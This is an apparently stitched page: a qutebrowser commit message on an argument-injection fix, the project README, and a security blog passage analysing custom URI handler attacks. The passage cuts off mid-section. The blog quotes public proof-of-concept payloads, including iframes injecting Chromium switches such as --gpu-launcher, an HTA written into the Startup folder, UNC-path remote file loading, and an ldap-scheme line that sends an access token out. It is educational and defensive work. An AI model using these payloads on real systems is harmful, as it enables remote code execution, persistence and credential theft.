[CVE-2021-41146](https://github.com/advisories/GHSA-vw27-fwjf-5qxm "CVE-2021-41146"): Add --untrusted-args to avoid argument injection

On Windows, if an application is registered as an URL handler like this:

    HKEY_CLASSES_ROOT
        https
            URL Protocol = ""
            [...]
            shell
                open
                    command
                    (Default) = ".../qutebrowser.exe" "%1"

one would think that Windows takes care of making sure URLs can't inject
arguments by containing a quote. However, this is not the case, as
stated by the Microsoft docs:
[https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914%28v%3Dvs.85%29)

    Security Warning: Applications that handle URI schemes must consider how to
    respond to malicious data. Because handler applications can receive data
    from untrusted sources, the URI and other parameter values passed to the
    application may contain malicious data that attempts to exploit the handling
    application.

and

    As noted above, the string that is passed to a pluggable protocol handler
    might be broken across multiple parameters. Malicious parties could use
    additional quote or backslash characters to pass additional command line
    parameters. For this reason, pluggable protocol handlers should assume that
    any parameters on the command line could come from malicious parties, and
    carefully validate them. Applications that could initiate dangerous actions
    based on external data must first confirm those actions with the user. In
    addition, handling applications should be tested with URIs that are overly
    long or contain unexpected (or undesirable) character sequences.

Indeed it's trivial to pass a command to qutebrowser this way - given how
trivial the exploit is to recreate given the information above, here's a PoC:

    https:x" ":spawn calc

(or qutebrowserurl: instead of https: if qutebrowser isn't registered as a
default browser)

Some applications do escape the quote characters before calling
qutebrowser - but others, like Outlook Desktop or .url files, do not.

As a fix, we add an --untrusted-args flag and some early validation of the raw
sys.argv, before parsing any arguments or e.g. creating a QApplication (which
might already allow injecting Qt flags there).

We assume that there's no way for an attacker to inject flags *before* the %1
placeholder in the registry, and add --untrusted-args as the last argument of
the registry entry. This way, it'd still be possible for users to customize
their invocation flags without having to remove --untrusted-args.

After --untrusted-args, however, we have some rather strict checks:

- There should be zero or one arguments, but not two (or more)
- Any argument may not start with - (flag) or : (qutebrowser command)

We also add the --untrusted-args flag to the Linux .desktop file, though it
should not be needed there, as the specification there is sane:

<https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html#exec-variables>

    Implementations must take care not to expand field codes into multiple
    arguments unless explicitly instructed by this specification. This means
    that name fields, filenames and other replacements that can contain spaces
    must be passed as a single argument to the executable program after
    expansion.

There is no comparable mechanism on macOS, which opens the application without
arguments and then sends an "open" event to it:
<https://doc.qt.io/qt-5/qfileopenevent.html>

This issue was introduced in qutebrowser v1.7.0 which started registering it as
URL handler: [baee288](https://github.com/qutebrowser/qutebrowser/commit/baee2888907b260881d5831c68500941937261a0) / [#4086](https://github.com/qutebrowser/qutebrowser/pull/4086)

This is by no means an issue isolated to qutebrowser. Many other projects have
had similar trouble with Windows' rather unexpected behavior:

qutebrowser is a keyboard-focused browser with a minimal GUI. It’s based
on Python and Qt and free software, licensed under the GPL.

It was inspired by other browsers/addons like dwb and Vimperator/Pentadactyl.

**qutebrowser’s primary maintainer, The-Compiler, is currently working
part-time on qutebrowser, funded by donations.** To sustain this for a long
time, your help is needed! See the
[GitHub Sponsors page](https://github.com/sponsors/The-Compiler/) or
[alternative donation methods](https://github.com/qutebrowser/qutebrowser/blob/main/README.asciidoc#donating)
for more information. Depending on your sign-up date and how
long you keep a certain level, you can get qutebrowser t-shirts, stickers and
more!

## Downloads

See the [GitHub releases
page](https://github.com/qutebrowser/qutebrowser/releases) for available downloads and the [INSTALL](/qutebrowser/qutebrowser/blob/main/doc/install.asciidoc) file for
detailed instructions on how to get qutebrowser running on various platforms.

## Documentation and getting help

Please see the [help page](/qutebrowser/qutebrowser/blob/main/doc/help/index.asciidoc) for available documentation
pages and support channels.

## Contributions / Bugs

You want to contribute to qutebrowser? Awesome! Please read
[the contribution guidelines](/qutebrowser/qutebrowser/blob/main/doc/contributing.asciidoc) for details and
useful hints.

If you found a bug or have a feature request, you can report it in several
ways:

* Use the built-in `:report` command or the automatic crash dialog.
* Open an issue in the Github issue tracker.
* Write a mail to the
  [mailinglist](https://listi.jpberlin.de/mailman/listinfo/qutebrowser) at
  qutebrowser@lists.qutebrowser.org.

Please report security bugs to security@qutebrowser.org
(or if GPG encryption is desired, contact me@the-compiler.org with GPG ID
[0x916EB0C8FD55A072](https://www.the-compiler.org/pubkey.asc)).

Alternatively,
[report a vulnerability](https://github.com/qutebrowser/qutebrowser/security/advisories/new)
via GitHub’s
[private reporting feature](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing/privately-reporting-a-security-vulnerability).

## Requirements

The following software and libraries are required to run qutebrowser:

* [Python](https://www.python.org/) 3.9 or newer
* [Qt](https://www.qt.io/), either 6.2.0 or newer, or 5.15.0 or newer, with the following modules:

  + QtCore / qtbase
  + QtQuick (part of qtbase or qtdeclarative in some distributions)
  + QtSQL (part of qtbase in some distributions)
  + QtDBus (part of qtbase in some distributions; note that a connection to DBus at
    runtime is optional)
  + QtOpenGL
  + QtWebEngine (if using Qt 5, 5.15.2 or newer), or
  + alternatively QtWebKit (5.212) - **This is not recommended** due to known security
    issues in QtWebKit, you most likely want to use qutebrowser with the
    default QtWebEngine backend (based on Chromium) instead. Quoting the
    [QtWebKit releases page](https://github.com/qtwebkit/qtwebkit/releases):
    *[The latest QtWebKit] release is based on [an] old WebKit revision with known
    unpatched vulnerabilities. Please use it carefully and avoid visiting untrusted
    websites and using it for transmission of sensitive data.*
* [PyQt](https://www.riverbankcomputing.com/software/pyqt/intro) 6.2.2 or newer
  (Qt 6) or 5.15.0 or newer (Qt 5)
* [jinja2](https://palletsprojects.com/p/jinja/)
* [PyYAML](https://github.com/yaml/pyyaml)

On macOS, the following libraries are also required:

* [pyobjc-core and pyobjc-framework-Cocoa](https://pyobjc.readthedocs.io/en/latest/)

The following libraries are optional:

* [adblock](https://pypi.org/project/adblock/) (for improved adblocking using ABP syntax)
* [pygments](https://pygments.org/) for syntax highlighting with `:view-source`
  on QtWebKit, or when using `:view-source --pygments` with the (default)
  QtWebEngine backend.
* On Windows, [colorama](https://pypi.python.org/pypi/colorama/) for colored log
  output.
* [asciidoc](https://asciidoc.org/) to generate the documentation for the `:help`
  command, when using the git repository (rather than a release).

See [the documentation](/qutebrowser/qutebrowser/blob/main/doc/install.asciidoc) for directions on how to
install qutebrowser and its dependencies.

## Donating

**qutebrowser’s primary maintainer, The-Compiler, is currently working
part-time on qutebrowser, funded by donations.** To sustain this for a long
time, your help is needed! See the
[GitHub Sponsors page](https://github.com/sponsors/The-Compiler/) for more
information. Depending on your sign-up date and how long you keep a certain
level, you can get qutebrowser t-shirts, stickers and more!

GitHub Sponsors allows for one-time donations (using the buttons next to "Select a
tier") as well as custom amounts. **For currencies other than Euro or Swiss Francs, this
is the preferred donation method.** GitHub uses [Stripe](https://stripe.com/) to accept
payment via credit cards without any fees. Billing via PayPal is available as well, with
less fees than a direct PayPal transaction.

Alternatively, the following donation methods are available — note that
eligibility for swag (shirts/stickers/etc.) is handled on a case-by-case basis
for those, please get in touch for details.

* [Liberapay](https://liberapay.com/The-Compiler), which can handle payments
  via Credit Card, SEPA bank transfers, or Paypal. Payment fees are paid by me,
  but they are [relatively low](https://liberapay.com/about/faq#fees).
* SEPA bank transfer inside Europe (**no fees**):

  + Account holder: Florian Bruhin
  + Country: Switzerland
  + IBAN (EUR): CH13 0900 0000 9160 4094 6
  + IBAN (other): CH80 0900 0000 8711 8587 3
  + Bank: PostFinance AG, Mingerstrasse 20, 3030 Bern, Switzerland (BIC: POFICHBEXXX)
  + If you need any other information: Contact me at mail@qutebrowser.org.
  + If possible, **please consider yearly or semi-yearly donations**, because
    of the additional overhead from many individual transactions for
    bookkeeping/tax purposes.
* PayPal:
  [CHF](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=me%40the-compiler.org&item_name=qutebrowser&currency_code=CHF&source=url),
  [EUR](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=me%40the-compiler.org&item_name=qutebrowser&currency_code=EUR&source=url),
  [USD](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=me%40the-compiler.org&item_name=qutebrowser&currency_code=USD&source=url).
  **Note: Fees can be very high (around 5-40%, depending on the donated amounts)** - consider
  using GitHub Sponsors (credit card), Liberapay (credit cards, PayPal, or bank
  transfer) or SEPA bank transfers instead.
* Cryptocurrencies:

  + Bitcoin: bc1q3ptyw8hxrcfz6ucfgmglphfvhqpy8xr6k25p00
  + Bitcoin Cash: 1BnxUbnJ5MrEPeh5nuUMx83tbiRAvqJV3N
  + Ethereum: 0x10c2425856F7a8799EBCaac4943026803b1089c6
  + Litecoin: MDt3YQciuCh6QyFmr8TiWNxB94PVzbnPm2
  + Others: Please get in touch, I’d happily set up anything [supported by Ledger Live](https://www.ledger.com/supported-crypto-assets)

## Sponsors

Thanks a lot to [MacStadium](https://www.macstadium.com/) for supporting
qutebrowser with a free hosted Mac Mini via their
[Open Source Project](https://www.macstadium.com/opensource).

(They don’t require including this here - I’ve just been very happy with their
offer, and without them, no macOS releases or tests would exist)

Thanks to the [HSR Hochschule für Technik Rapperswil](https://www.hsr.ch/), which
made it possible to work on qutebrowser extensions as a student research project.

## Authors

qutebrowser’s primary author is Florian Bruhin (The Compiler), but qutebrowser
wouldn’t be what it is without the help of
[hundreds of contributors](https://github.com/qutebrowser/qutebrowser/graphs/contributors)!

Additionally, the following people have contributed graphics:

* Jad/[yelo](https://yelostudio.com) (new icon)
* WOFall (original icon)
* regines (key binding cheatsheet)

Also, thanks to everyone who contributed to one of qutebrowser’s
[crowdfunding campaigns](/qutebrowser/qutebrowser/blob/main/doc/backers.asciidoc)!

Custom protocol handlers are an obscure attack surface. They allow us to convert
local attacks into remote ones and are an alternative way to
[jump the browser sandbox without 0days](/blog/2020-08-13-localghost-escaping-the-browser-sandbox-without-0-days/ "jump the browser sandbox without 0days")).

Similar to the first part of this series
[A Novel Way to Bypass Executable Signature Checks with Electron](/blog/2021-01-08-attack-surface-analysis-part-1-application-update-a-novel-way-to-bypass-executable-signature-checks-with-electron/ "A Novel Way to Bypass Executable Signature Checks with Electron")
I will analyze this attack surface and discuss a few interesting public bugs. I
wanted to discuss two of my undisclosed bugs but the post is already too long.

**2021-04-21 updates**:

1. Startup path limitations and possible workarounds.
2. Positive security's excellent blog released a month after this with a near
   jar trick.
3. [Allow arbitrary URLs, expect arbitrary code execution](https://positive.security/blog/url-open-rce).

The article has a great trick for passing parameters when we cannot. Use `jar`
files in UNC paths: `\\ip\path\whatever.jar`. Search for `windows-10-19042` in
the page.

**TL;DR:** Custom protocol handlers are a great attack surface and allow us to
exploit local vulnerabilities from the browser. If the target app registers a
handler, analyze how the arguments are processed and if they can be used to
launch an attack. As a developer, do not trust any input that comes from URIs.

# Introduction

You can register a scheme (e.g., `bleh`) and then run your app from the browser
(or locally). If the user clicks on `bleh://whatever` the browser asks if they
want to run your app (Firefox allows saving this selection). If the app is set
up to handle the URI like `"C:/whatever/app.exe" "%1"` (the most common way),
the OS will execute `app.exe "bleh://whatever"`. The browser also does some
parameter encoding but that is out of scope for this post.

For a great introduction please read
[Web-to-App Communication: App Protocols](https://textslashplain.com/2019/08/29/web-to-app-communication-app-protocols/) by
[Eric Lawrence](https://twitter.com/ericlaw).

Protocols are registered by adding a registry key under `HKEY_CLASSES_ROOT`.
Open regedit and go to
`Computer\HKEY_CLASSES_ROOT\WMP11.AssocProtocol.MMS\shell\open\command` to see
a scheme for the Windows Media Player app:

![WMP11.AssocProtocol.MMS handler](01-wmplayer-run.png "WMP11.AssocProtocol.MMS handler")
WMP11.AssocProtocol.MMS handler

1. Type `wmp11.assocprotocol.mms:https://example.net` in any browser's address
   bar and press enter.
   1. Alternative 1: Run `wmp11.assocprotocol.mms:https://example.net` in the
      Run prompt (`Win+R`).
   2. Alternative 2: Run `start wmp11.assocprotocol.mms:https://example.net` in cmd.
2. In the browser you will get a prompt that asks if you want to open the
   Windows Media Player.
3. If you accept the prompt, Media Player will start and complain about the URL.

In [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) we can see what was passed to the app.

![WMPlayer command-line in procmon](02-wmplayer-procmon.png "WMPlayer command-line in procmon")

To see all registered handlers use [URLProtocolView](https://www.nirsoft.net/utils/url_protocol_view.html) by
Nirsoft.

## Privilege Escalation via Protocol Handlers

Remember our three privilege levels from part 1?

1. Remote attacker
2. Local attacker running as a standard user
3. Local admin/SYSTEM

Remote attackers can reach URI handlers. If you can get users to click a link in
the browser then you can execute a local app with your controlled parameters
(terms and conditions apply). You can escalate your privilege from a remote
attacker to a local one.

So far, we have established that it's a usually ignored but rich attack surface
that we should pay attention to. In the rest of the post, I am going to try
and classify different vulnerabilities in this space and discuss some public
bugs. I have linked to every writeup at the beginning of each section so make
sure to read the actual bug, too.

# Unsanitized Input

Apps usually trust their command-line switches. After all, why should I care if
a user can spawn a new process as themselves through my app? We can take
advantage of this trust.

To discover these types of vulnerabilities, we need to observe what command-line
switches are available, how they are processed, and finally, check if the
app's behavior can be altered by our supplied arguments.

You will see some overlap between this section and the next. The exploits here
just inject values into the command-line but the next also pass remote files.

## Possible RCE through Windows Custom Protocol on [Nord VPN] Windows Client by @Cyku

This is a disclosed HackerOne report by [Cyku](https://twitter.com/cyku_tw). The report is at
<https://hackerone.com/reports/1001255>.

They used the URI protocol handler to pass a serialized notification string to
the Nord VPN Windows client. The app would deserialize the input and use the
value of the `OpenUrl` parameter to spawn a new process. An attacker can get
code execution on your machine if they can get you to click a link on a webpage.

Looking at the call stack in the report, the input is passed to
[Process.Start(String)](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-5.0#System_Diagnostics_Process_Start_System_String_). This is an overload of
`Process.Start` that just executes the file passed to it. An unfortunate
limitation of this overload is not being able to pass parameters.

**Update 2021-04-29:** It seems like we can pass remote `jar` files as a UNC
path to get around this limitation. See section
[Windows 10 19042](https://positive.security/blog/url-open-rce#windows-10-19042) in Positive Security's article linked
above.

### Find Bugs Like This with dnSpy

The previous bug was not easy to find and I probably would not have found it.
dnSpy can help you, but you still need to do the flow analysis and read
decompiled source code.

If you have a .NET app, try this workflow:

1. Drag and drop everything in the installation directory into dnSpy.
2. Search for `Process.Start` in `Edit (menu) > Search Assembly`.
3. Right-click every overload in the code and select `Analyze`.
   1. `Process.Start` has multiple overloads.
4. Go down the usage chain by repeatedly opening `Used By`.
5. Continue until you get to a location where input is user-controlled.
6. ???
7. RCE

You can also put a breakpoint on `Process.Start` and then run the app. When the
breakpoint is triggered look at the input and also use the `call stack` feature
to see how you have landed at the breakpoint.

## Origin Remote Code Execution by @zer0pwn

Disclosure: I work for [EA security](https://ea.com/security) and Origin is one of our
products. [Dominik Penner/zer0pwn](https://twitter.com/zer0pwn) has a couple of Origin bugs
that I am going to discuss.

The first one is [Fun With Custom URI Schemes](https://zero.lol/2019/05/22/fun-with-uri-handlers) and while not
exploitable directly from the browser, it deals with how Qt (pronounced cute)
command-line switches can result in remote code execution. It's a good start if
you want to start doing security research on Qt apps.

You can pass a command-line switch to Qt apps to designate the path to
plugins. Qt plugins (at least on Windows) are DLLs that can spawn new processes.
If you want to know more about Qt issues like this please read
[Loading up a Pair of Qt Bugs: Detailing CVE-2019-1636 and CVE-2019-6739](https://www.thezdi.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739)

The blog experiments with passing a UNC path to a remote path to this switch:

```
<iframe src='origin://?"
    -platformpluginpath \\path\to\remote\plugindir\ "
'>

```

Unfortunately (well fortunately for us at EA), the browser encoding saves us.
The payload becomes
`Origin.exe "origin:///?%22-platformpluginpath \\path\to\remote\plugindir\ %22"`
which doesn't work.

The workaround is a `.URL` file. Think of it as a shortcut file. You can
put custom URIs in it and they do not get encoded. So, a URL file like this
works.

```
[InternetShortcut]
URL=origin://?" -platformpluginpath \\path\to\remote\plugindir\ "

```

However, you need to social engineer the users to not only click on the link to
download your file but to also run it. If you can get people to run a file they
have downloaded you do not need Origin although, having a shortcut with the
Origin icon helps. It's a great bug and I am not trying to downplay it.

We were not so lucky with the second bug
[A Questionable Journey From XSS to RCE](https://zero.lol/2019/05/13/xss-to-rce). Origin frontend uses
Angular and it was vulnerable to a well-known sandbox escape.

You could pass a URI scheme and inject values into `title`.
`origin://game/launch/?offerIds=0&title={{7*7}}`. This is the typical Angular
template injection testing payload and should inject `49` there.

A sandbox bypass was discovered and used. There are a ton of these going around.
For a great intro please see
[So you thought you were safe using AngularJS.. Think again!](https://www.slideshare.net/LewisArdern/so-you-thought-you-were-safe-using-angularjs-think-again)
by my good friend and solid 5/7 JavaScript guy, [Lewis Ardern](https://twitter.com/LewisArdern).

Now, we have client-side template injection and can inject JavaScript. This is
not Electron where you can just run `require('child_process').exec('calc')` and
get RCE on [PlayStation Now](https://hackerone.com/reports/873614) (shameless brag).

Origin had a "JavaScript bridge" (if I may) that allowed JavaScript to call
`QDesktopServices`. A function named `asyncOpenUrl()` calls `openUrl()` which
allows us to open URLs and also schemes.Using that limited RCE was possible.

**Update 2024**: I made a separate blog posts in this topic a few months later,
[The JavaScript Bridge in Modern Desktop Applications](/blog/2021-06-08-the-javascript-bridge-in-modern-desktop-applications/ "The JavaScript Bridge in Modern Desktop Applications")).

For example, you could pop calc with
`Origin.client.desktopServices.asyncOpenUrl("calc.exe")`. Unfortunately, this is
a limitation of these functions. You cannot pass parameters to them. The same
limitation was in the Nord VPN bug with the `Process.Start(string)` overload. I
have spent quite some time trying to break out to no avail (future blog post?).

**Update 2021-04-29:** It seems like we can pass remote `jar` files as a UNC
path to get around this limitation. See section
[Windows 10 19042](https://positive.security/blog/url-open-rce#windows-10-19042) in Positive Security's article linked
above.

However, the payload is running in a JavaScript context and you have access to
things like user tokens. The authors found a clever way of exfiltrating user
information such as access tokens using the `ldap` scheme like
`"ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"`.

As the [Ninth Doctor](https://en.wikipedia.org/wiki/Ninth_Doctor) (best doctor) would have said, fantastic!

## Linux Mint 18.3-19.1 'yelp' Command Injection by @b1ack0wl

[@b1ack0wl](https://twitter.com/b1ack0wl) pointed me to this bug in the URI handler for
Yelp. I realized I have only talked about Windows and it might imply that URI
bugs only happen on Windows. Here, we can see that it's possible to have a
similar bug on Linux.

[The URI handler for yelp](https://github.com/b1ack0wl/linux_mint_poc) is run like `Exec=yelp %u`. Think of
it as `app.exe %1` without quotes. In this case, the URI is passed (note the
lack of quotes) directly to the following Python file:

```
#!/usr/bin/python
import os
import sys
if (len(sys.argv) > 1):
    args = ' '.join(sys.argv[1:])
    if ('gnome-help' in args) and not os.path.exists('/usr/share/help/C/gnome-help'):
        os.system ("xdg-open http://www.linuxmint.com/documentation.php &")
    elif ('ubuntu-help' in args) and not os.path.exists('/usr/share/help/C/ubuntu-help'):
        os.system ("xdg-open http://www.linuxmint.com/documentation.php &")
    else:
        os.system ("/usr/bin/yelp %s" % args)  # uh oh
else:
    os.system ('/usr/bin/yelp')

```

If the URI string does not contain `gnome-help` and `ubuntu-help`, it's passed
to a vulnerable `os.System` invocation.

### Browsers Escaping Characters

Now, browser escaping comes into play. It is something we have not had to deal
with in our reviewed bugs, yet. Browsers encode/escape specific characters
before passing them on.
[Exploiting Custom Protocol Handlers in Windows](https://web.archive.org/web/20200525025338/https%3A//www.vdoo.com/blog/exploiting-custom-protocol-handlers-in-windows) in the
references section has a section about encoding/bypassing and you can find a few
more on the web.

[Chromium bug 785809](https://bugs.chromium.org/p/chromium/issues/detail?id=785809) has some good discussions about what to
encode and how to do it ([comment #22](https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22) is the most important
IMO). It also touches on how Windows handles URI paths
([comment #21](https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22)).

Chrome encodes space to `%20`. So, they replaced it with `$IFS$()`. The default
value of it is `space, tab, newline`. [Internal Field Separator or IFS](https://bash.cyberciti.biz/guide/%24IFS)
tells bash how to separate words.

You can also smuggle `@` into the URI strings because the parsers are looking
for `protocol://user:pass@server.tld/`. [Tweet](https://twitter.com/jonasLyk/status/1372952003719143428) by
[@jonasLyk](https://twitter.com/jonasLyk)

# Loading Remote Files

We can also pass remote files to the target app via these URI handlers. It's an
old technique. I learned it from Raymond Chen's blog post
[subtle ways your innocent program can be Internet-facing](https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263)
written in 2006.

> Of course, the attacker also controls the contents of the file, so any
> vulnerabilities in your file parser can be exploited as well.
>
> Code injection via file contents is an elevation of privilege.

> **Raymond Chen**
> [devblogs.microsoft.com/...](https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263 "https://devblogs.microsoft.com/oldnewthing/20060509-30/?p=31263")

## UNC Paths

On Windows, we usually use UNC (Universal Naming Convention) paths to reference
remote files. They look like `\\server\path\to\file`.

In my proofs-of-concept, I use a local share but in the real world you can set up
a remote server with an open share and host your malicious files.

To know more about UNC paths please read the `UNC Absolute` section of
[James Forshaw's](https://github.com/tyranid) excellent article
[The Definitive Guide on Win32 to NT Path Conversion](https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html). I have
read it a few times but I mostly treat it as a reference and read specific
sections when I have a problem.

## CVE-2019-6453 - RCE on mIRC Using Argument Injection Through Custom URI Protocol Handlers by @ProofOfCalc

Take some time to read the write-up at
<https://proofofcalc.com/cve-2019-6453-mIRC/>.

The protocol handler for mIRC was setup like
`"C:\Program Files (x86)\mIRC\mirc.exe" %1` and you could pass command-line
switches to the app. The `-i` switch runs a configuration file on startup. That
config file can specify script files and execute them. These script files can
execute code and spawn new processes.

The authors combined the URL handler vuln with a remote configuration file. They
created a link with a UNC path to a remote config file. The link looks like
`<iframe src='irc://? -i\\127.0.0.1\C$\mirc-poc\mirc.ini' />` and runs
`mirc.exe -i \\127.0.0.1\C$\mirc-poc\mirc.ini`.

mIRC loads the remote config file on startup. The config file has a section
where a separate remote script is mentioned. mIRC loads and executes that script
file. The script file then runs code.

### The `--`

Let's talk a little bit about the `--` mentioned in the previous bug.
Command-line switches come in three flavors: named arguments, positional
arguments, and flags. In `parse.exe --verbose --config file.cfg myfile` we have:

* `--verbose` is a flag. If the flag exists its value is `true`.
* `--config` is a named argument with value `file.cfg`.
* `myfile` is a positional argument. It's parsed based on position.

Having `--` in the arguments means everything after that will be treated as a
positional argument so we cannot pass named arguments anymore. Let's say the
protocol handler for our app is `app.exe %1` and we need to accept a positional
argument from the URI. Attackers can pass extra command-line switches to the app
and do bad things. But using `app.exe -- "%1"` means everything will be treated
as a positional argument.

This is not a silver bullet. The app might process the string and extract
arguments from it. Even if we can avoid all named arguments, apps usually accept
a positional argument that is a file they load. Thus, the app might still be
vulnerable when we pass a malicious remote file to it.

## CVE-2020-13699 - Unquoted URI handler in TeamViewer by @Jeffssh

Another avenue of attack is passing remote files and capturing NTLM credentials.
This is a topic that I do not know much about so feel free to correct me here.
Do we get to capture NTLM credentials every time we let an app open a remote
share?! Is it always bad? I do not know.

[Unquoted URI handler in the TeamViewer Windows Desktop Application](https://jeffs.sh/CVEs/CVE-2020-13699.txt)
by [Jeffrey Hofmann](https://twitter.com/jeffssh) does this. In short, you can create a URI
scheme and make the Teamviewer app open a remote share and capture the NTLM
credentials send by the OS.

# Command-Line Switch Injection

Depending on how the app processes these passed parameters, it might be possible
to sneak a command via a command-line switch.

## Electron and CEF command-line Injections by rgod

`rgod` or if I am not mistaken [Andrea Micalizzi](http://retrogod.altervista.org/) found a ton
of these command injections. They could inject commands in [Electron](https://www.electronjs.org/)
and [Chromium Embedded Framework (CEF)](https://bitbucket.org/chromiumembedded/cef/src) apps from the URI.

This ZDI article by Vincent Lee
[Top 5 Day Two: Electron Boogaloo - a Case for Technodiversity](https://www.thezdi.com/blog/2018/12/18/top-5-day-two-electron-boogaloo-a-case-for-technodiversity)
explores these bugs in detail.

The ZDI advisory pages don't contain any details so I am not linking to them.
It's very disappointing. We can only learn about these disclosed and fixed bugs
from the end-of-the-year blog post. That said, it's their bugs and they can do
whatever they want with them.

### Microsoft Teams Command Injection

In the Microsoft Teams exploit rgod passed a parameter named `gpu-launcher` to
the app.

```
<iframe src='msteams://?"
  --disable-gpu-sandbox
  --no-sandbox
  --gpu-launcher="cmd.exe /c start calc | pause
'>

```

* [gpu-launcher](https://chromium.googlesource.com/chromium/chromium/%2B/master/content/public/common/content_switches.cc#414) is a Chromium command-line switch that
  launches a new process. In this case, it's the GPU process for Chromium.
* [disable-gpu-sandbox](https://chromium.googlesource.com/chromium/chromium/%2B/master/content/public/common/content_switches.cc#118) disables the GPU process
  sandbox (d'oh) which I assume allows the GPU process to do whatever.
* [no-sandbox](https://chromium.googlesource.com/chromium/chromium/%2B/master/content/public/common/content_switches.cc#463) "disables the sandbox for all process types
  that are normally sandboxed."

The
[Electron framework was passing the Chromium switches directly](https://www.electronjs.org/blog/protocol-handler-fix)
from the URI to the instances. The beauty of finding a framework exploit is
being able to hit multiple applications with one stone. The
[Ubisoft Uplay Desktop Client](https://thewhiteh4t.github.io/2018/11/16/ubisoft-uplay-rce-exploit.html) and the [Exodus wallet](https://hackernoon.com/exploiting-electron-rce-in-exodus-wallet-d9e6db13c374) had
similar issues.

### Google Web Designer Command Injection via The Log File

The Google Web Designer bug is more complex and a neat trick. It took me 30
minutes and a few rabbit holes to figure it out.

> However, we have not seen any public PoC using the exploit techniques
> demonstrated by rgod in his other submissions. In the submission for ZDI-18-552

```
<a href='gwd-template://?"
  --type=">>>>>>>>>>>>>>>>>>>>>>
    <script> var x=new ActiveXObject(\"WScript.Shell\"); x.Exec(\"calc.exe\");</script>"
  --no-sandbox
  --log-file=
    "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta"
  --log-severity=verbose /'>
  clickme
</a>

```
#### The type Switch

According to the [source code](https://chromium.googlesource.com/chromium/chromium/%2B/master/content/public/common/content_switches.cc#507), the `type` switch sets the process
type. Originally, I thought there was an injection vulnerability when this
switch was processed. The payload looks like a typical XSS payload.
We are injecting JScript (think Microsoft's JavaScript) after all. This value is
directly written to the log file.

![Google Web Designer POC Image. Image credit: ZDI blog](03-gwd-poc.png "Google Web Designer POC Image. Image credit: ZDI blog")
Google Web Designer POC Image. Image credit: ZDI blog

Alt text for this image:

```
Screenshot of a Windows machine. It shows several windows. The top left is an
Internet Explorer page with parts of the address bar visible
"http://172.16.51.1:8080/poc.html" which is most likely the HTML file from the
previous picture opened in IE.

Under that (still, top left) is an instance of the Windows calculator. This is
what they call "popping calc" which is executing calculator to show command
execution.

The top right is the typical Windows error dialog for "Google Web Designer." It says
"Google Web designer has stopped working" and has the buttons that "check for a
solution online" or "close the program".

The bottom right is a log file opened in notepad. It is the HTA app from the
previous payload. It has some logs about the Google web designer app.

```

Look at the contents of the log file (opened as an HTA app) in the picture above
(I added a red rectangle to highlight the location I am talking about). In some
old [Chromium source code](https://chromium.googlesource.com/aosp/platform/external/libchrome/%2B/refs/heads/stabilize-8530.93.B/base/metrics/histogram_base.cc#136), we can see how this log
entry is created (it's does not exist in
[the current version](https://chromium.googlesource.com/aosp/platform/external/libchrome/%2B/refs/heads/master/base/metrics/histogram_base.cc)):

```
void HistogramBase::EnableActivityReportHistogram(
    const std::string& process_type) {
  DCHECK(!report_histogram_);
  // Code removed
  std::string name =
      "UMA.Histograms.Activity" +
      (process_type.empty() ? process_type : "." + process_type); // <--- Injection
  // Comment removed
  report_histogram_ = LinearHistogram::FactoryGet(
      name, 1, HISTOGRAM_REPORT_MAX, HISTOGRAM_REPORT_MAX + 1,
      kUmaTargetedHistogramFlag);
  report_histogram_->Add(HISTOGRAM_REPORT_CREATED);
}

```

The `name` string contains the type of the process. It is injected with the
`type` switch and then reflected as-is in the log file.

#### The Payload

The payload runs the Windows calculator. It's written in JScript.

```
var x=new ActiveXObject("WScript.Shell");
x.Exec("calc.exe");

```

We have complete control here and unlike `Process.Start` above we are not
limited to just running executables. We can provide our parameters and pretty
much do anything. HTAs also support VBScript like this
[proof of concept](https://github.com/arntsonl/calc_security_poc/blob/master/hta/calc.hta) by my old colleague Luke Arntson.

#### The Log File

The `log-file` switch does not appear in the current Chromium or CEF switches.
It was probably removed? It's pointing to the location of the log file.

`C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/suntzu.hta`

`STARTM~1` is the shortpath notation for `Start Menu`. The payload uses the good
ole' `8.3` notation to avoid having spaces in the path. Shortpath also works on
directories because directory names are stored as a
[special type of files](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#:~:text=Note%20that%20directory%20names%20are%20stored%20by%20the%20file%20system%20as%20a%20special%20type%20of%20file,).

It's the startup directory for the administrator. Every time the user logs on,
the contents of the directory are executed. This includes the injected HTA file.

`log-severity` appears to have been replaced with `log-level`. Setting it to
`verbose` almost certainly added those messages with the process type to the
log file.

#### How Does This Work?

There are two main questions:

1. The payload has garbage logs around it. How does it get parsed correctly?
2. How is the HTA file executed every time the user logs on?

To answer both, we are going to replicate this in a VM. Store the following in a
file named `whatever.hta`.

```
Text before the payload.
<script>
  var x=new ActiveXObject("WScript.Shell");
  x.Exec("calc.exe");
</script>
Text after the payload.

```

Now we can run this file by double-clicking on it. HTA files are executed by
`mshta.exe` and contain HTML apps. Inside these apps, you can have more than
just normal JavaScript. For more information, please see
[Introduction to HTML Applications (HTAs) on docs.microsoft.com](https://docs.microsoft.com/en-us/previous-versions//ms536496%28v%3Dvs.85%29),
especially the section named `The Power of Trust: HTAs and Security`.

![whatever.hta executed](05-hta-executed.png "whatever.hta executed")
whatever.hta executed

Because they are HTML applications the text before and after the script is
treated like, well, text. The script is executed. Hence why you do not see it in
the resulting page. We can see the processes in procmon:

